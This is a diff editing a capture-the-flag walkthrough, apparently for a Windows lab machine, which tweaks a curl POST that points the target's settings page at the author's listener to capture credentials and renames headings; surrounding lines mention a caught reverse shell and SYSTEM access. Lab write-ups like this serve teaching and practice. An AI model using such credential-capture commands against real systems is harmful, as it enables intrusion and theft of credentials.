@@ -420,7 +420,7 @@ I'll open a listener on my own machine on port `389`:
 Then I'll send a POST request to `settings.php` with the IP set to my own.
 
 ```sh
-❯ curl -s -o "/dev/null" "http://10.10.11.108/settings.php" -X "POST" -d "ip=10.10.14.9"
+❯ curl -s -o "/dev/null" "http://10.10.11.108/settings.php" -X "POST" --data-urlencode "ip=10.10.14.9"
 ```
 
 If we check our listener:
@@ -637,6 +637,8 @@ Ethernet adapter Ethernet0:
 
 There's only an Ethernet interface.
 
+## System enumeration
+
 ### Flags
 
 If we check our Desktop folder, we find the user flag.
@@ -782,7 +784,7 @@ PS C:\Windows\system32>
 
 It caught the reverse shell!
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `NT AUTHORITY\SYSTEM`!
 
